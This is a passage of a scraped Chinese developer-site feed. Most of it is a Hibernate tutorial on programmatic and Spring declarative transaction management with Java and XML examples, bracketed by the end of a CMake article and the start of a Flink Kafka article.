<pre><code class="hljs language-cmake" lang="cmake"># my_app 依赖 my_utils 这个库
target_link_libraries(my_app PRIVATE my_utils)

# 或者链接系统线程库
target_link_libraries(my_app PRIVATE Threads::Threads)
</code></pre>
<p>✅ <strong>剃刀理由</strong>：现代 CMake 强调“基于目标的依赖管理”。用 <code>target_link_libraries()</code> 不仅能链接库，还能自动传递头文件路径、编译选项等——它是组织依赖的唯一简洁且正确的方式。</p>
<hr/>
<h4 data-id="heading-36">🎯 举个完整小例子（三行搞定一个 C++ 项目）：</h4>
<pre><code class="hljs language-cmake" lang="cmake"># CMakeLists.txt
project(MyApp LANGUAGES CXX)
add_executable(hello main.cpp)
target_link_libraries(hello)  # 暂无依赖，可省略，但习惯保留结构
</code></pre>
<p>即使只有这三行，也能在任何平台生成 Makefile、Visual Studio 工程或 Xcode 项目！</p>
<hr/>
<h4 data-id="heading-37">✅ 总结（剃刀三要素）：</h4>

























<table><thead><tr><th>语法</th><th>作用</th><th>类比</th></tr></thead><tbody><tr><td><code>project()</code></td><td>起名字、定语言</td><td>给项目办“身份证”</td></tr><tr><td><code>add_executable()</code> / <code>add_library()</code></td><td>定义要构建什么</td><td>写“任务清单”</td></tr><tr><td><code>target_link_libraries()</code></td><td>声明依赖关系</td><td>画“关系图”</td></tr></tbody></table>
<p>只要掌握这三点，80% 的 CMake 项目都能看懂、能写。其余都是锦上添花，非“必要”。</p>
<blockquote>
<p>💡 记住：CMake 的核心思想不是“怎么编译”，而是“描述你的项目结构”。越简单，越强大。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（53）Hibernate的事务管理如何实现？]]></title>    <link>https://juejin.cn/post/7597270795211948072</link>    <guid>https://juejin.cn/post/7597270795211948072</guid>    <pubDate>2026-01-20T11:55:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211948072" data-draft-id="7597266967138140194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（53）Hibernate的事务管理如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T11:55:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（53）Hibernate的事务管理如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:03.000Z" title="Tue Jan 20 2026 11:55:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernate的事务管理是确保一组数据库操作要么全部成功，要么全部失败（回滚）的机制。它在确保数据一致性和完整性方面起着关键作用。Hibernate支持多种事务管理方式，如程序化事务管理和声明式事务管理。以下是详细的事务管理实现和代码示例。</p>
<h3 data-id="heading-0">1. 程序化事务管理</h3>
<p>程序化事务管理是指在代码中显式地控制事务的开始、提交和回滚。适用于简单应用或需要精确控制事务边界的场景。</p>
<h4 data-id="heading-1">配置Hibernate</h4>
<p>在<code>hibernate.cfg.xml</code>中配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">实体类定义</h4>
<p>以下是一个简单的实体类<code>Product</code>的定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">程序化事务管理的实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateTransactionExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建一个产品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// 保存产品</span>
        saveProduct(product);
        
        <span class="hljs-comment">// 更新产品</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        updateProduct(product);
        
        <span class="hljs-comment">// 删除产品</span>
        deleteProduct(product.getId());

        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.save(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.update(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                session.delete(product);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. 声明式事务管理</h3>
<p>声明式事务管理在Spring框架中很常见，通过注解或XML配置来管理事务。它不需要显式的事务管理代码，更简洁且易于维护。</p>
<h4 data-id="heading-5">Spring配置</h4>
<p>在Spring的配置文件<code>applicationContext.xml</code>中配置事务管理：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">"http://www.springframework.org/schema/tx"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Hibernate SessionFactory --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.LocalSessionFactoryBean"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"packagesToScan"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.example.domain"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernateProperties"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- DataSource --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driverClassName"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"jdbc:mysql://localhost:3306/your_database"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_username"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_password"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Transaction Manager --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.HibernateTransactionManager"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"sessionFactory"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Enable annotation-driven transaction management --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- Service layer beans --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"productService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.service.ProductService"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">实体类定义</h4>
<p>与程序化事务管理中的实体类定义相同，这里不再重复。</p>
<h4 data-id="heading-7">服务层定义</h4>
<p>在服务层中使用<code>@Transactional</code>注解来管理事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Session;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.save(product);
        System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.update(product);
        System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            session.delete(product);
            System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-8">使用服务层</h4>
<p>在客户端代码中使用服务层来进行数据库操作，事务管理由Spring自动处理：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringHibernateTransactionExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"applicationContext.xml"</span>);
        <span class="hljs-type">ProductService</span> <span class="hljs-variable">productService</span> <span class="hljs-operator">=</span> context.getBean(ProductService.class);

        <span class="hljs-comment">// 创建一个产品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// 保存产品</span>
        productService.saveProduct(product);

        <span class="hljs-comment">// 更新产品</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        productService.updateProduct(product);

        <span class="hljs-comment">// 删除产品</span>
        productService.deleteProduct(product.getId());
    }
}
</code></pre>
<h3 data-id="heading-9">总结</h3>
<ol>
<li><strong>程序化事务管理</strong>：在代码中显式地控制事务的开始、提交和回滚，适用于简单应用或需要精确控制事务边界的场景。</li>
<li><strong>声明式事务管理</strong>：通过Spring框架的注解或XML配置来管理事务，不需要显式的事务管理代码，更简洁且易于维护。</li>
</ol>
<p>通过这些方法，可以有效地管理Hibernate应用程序中的事务，确保数据的一致性和完整性。希望这些详细的解释和代码示例能帮助您更好地理解和应用Hibernate的事务管理技术。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Kafka Connector]]></title>    <link>https://juejin.cn/post/7597125475602317339</link>    <guid>https://juejin.cn/post/7597125475602317339</guid>    <pubDate>2026-01-20T14:05:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602317339" data-draft-id="7597125475602300955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Kafka Connector"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-20T14:05:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Kafka Connector
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
